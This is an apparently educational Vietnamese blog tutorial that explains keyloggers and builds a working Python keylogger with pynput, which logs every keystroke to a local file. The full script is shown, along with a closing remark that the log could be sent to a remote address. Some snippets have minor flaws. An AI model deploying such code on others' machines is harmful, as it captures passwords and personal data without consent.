Trong nội dung bài viết này, mình sẽ giới thiệu từng bước để tạo nên một keylogger bằng ngôn ngữ Python. Nhưng khoan hãy nói đến việc đó, liệu bạn đã từng nghe đến keylogger, hay keylogger là gì? Keylogger là một chương trình giúp chúng ta theo dõi được tổ hợp các phím được bấm trên bàn phím. Có vẻ hơi confused nhỉ, để dễ hiểu hơn mình sẽ lấy ví dụ, nếu bạn thực hiện gõ bất kì thứ gì trên bàn phím, Keylogger sẽ thực hiện theo dõi bạn vừa gõ những phím gì, sau đó lưu chúng vào một file, thường gọi là logfile, đặc biệt khá nguy hiểm nếu một số thông tin cá nhân nhạy cảm như username, mật khẩu, thông tin thẻ thanh toán trực tuyến,... của bạn đã bị theo dõi và lưu lại sau đó được chuyển đến tay kẻ xấu.

Oops! Nếu chưa từng nghe đến keylogger, liệu bạn có cảm thấy sợ hãi khi biết đến nó :sunglasses:
### Cài đặt thư viện hỗ trợ
Rồi, bây giờ cùng bắt đầu vào phần chính nhé. Để tạo keylogger, chúng ta sẽ sử dụng module [pynput](https://pypi.org/project/pynput/), một chút giới thiệu về pinput: đây là thư viện cho phép người dùng điều khiển, kiếm soát các thiết bị đầu vào, trong trường hợp này chúng ta cần kiểm soát bàn phím để kiểm soát dữ liệu được nhập từ bàn phím. Để có cái nhìn sâu hơn về pinput, bạn có thể đọc thêm tại [trang chủ](https://pypi.org/project/pynput/). Do nó không phải là thư viện chuẩn có sẵn của python nên chúng ta phải cài đặt thêm
```
pip install pynput
```
Kết quả nhận được:
![](https://images.viblo.asia/32abb3a8-4b27-440d-afb5-b984b2fb181b.png)
### Bắt đầu tạo Keylogger
Sau khi hoàn thành việc cài đặt thư viện cần dùng, chúng ta sẽ import các packages và method trong đó. Để có thể giám sát bàn phím, chúng ta sẽ sử dụng phương thức key và listener của pynput. Chúng ta cũng sẽ sử dụng logging module để ghi lại các tổ hợp phím được gõ vào file.
```
from pynput.keyboard import Listener
import logging
```
Tiếp theo là set đường dẫn nơi mà chúng ta sẽ lưu logfile.
```
log_dir = r"C:/users/username/desktop/"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
```
Sau đó chúng ta gọi hàm `on_press()` tạo định nghĩa cho việc gõ bàn phím và sử dụng phím mà chúng ta vừa gõ như một param
```
def on_press(key):
   logging.info(str(key))
```
Điều cuối cùng chúng ta cần làm là cài đặt một instance cho Listener và định nghĩa phương thức on_press()  ở trong đó, sau đó nối instance với main thread.
```
with Listener(on_press=on_press) as listener:
listener.join()
```
OK. DONE. bây giờ hãy gộp tất cả các bước trên, ta thu được file code hoàn chỉnh.
```
from pynput.keyboard import Listener
import logging
log_dir = r"/home/duong/Desktop"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
  logging.info(str(key))
with Listener(on_press=on_press) as listener:
  listener.join()
```
Tiến hành chạy chương trình và thử thao tác gõ phím, tôi nhận được file log ghi lại đúng những gì vừa gõ![](https://images.viblo.asia/eebef5d1-fb05-408f-bce4-81ce636e9d97.png)
OK, chỉ vài bước đơn giản chúng ta cũng có thể thấy nếu mã code này được chạy trên máy cộng với việc file log được lập trình để gửi đến một địa chỉ mà chúng ta không mong muốn, bạn có thể bị lộ rất nhiều thông tin nhạy cảm. Good luck :laughing:

Cảm ơn các bạn đã dành thời gian quan tâm đến bài viết của mình! Have fun :grinning: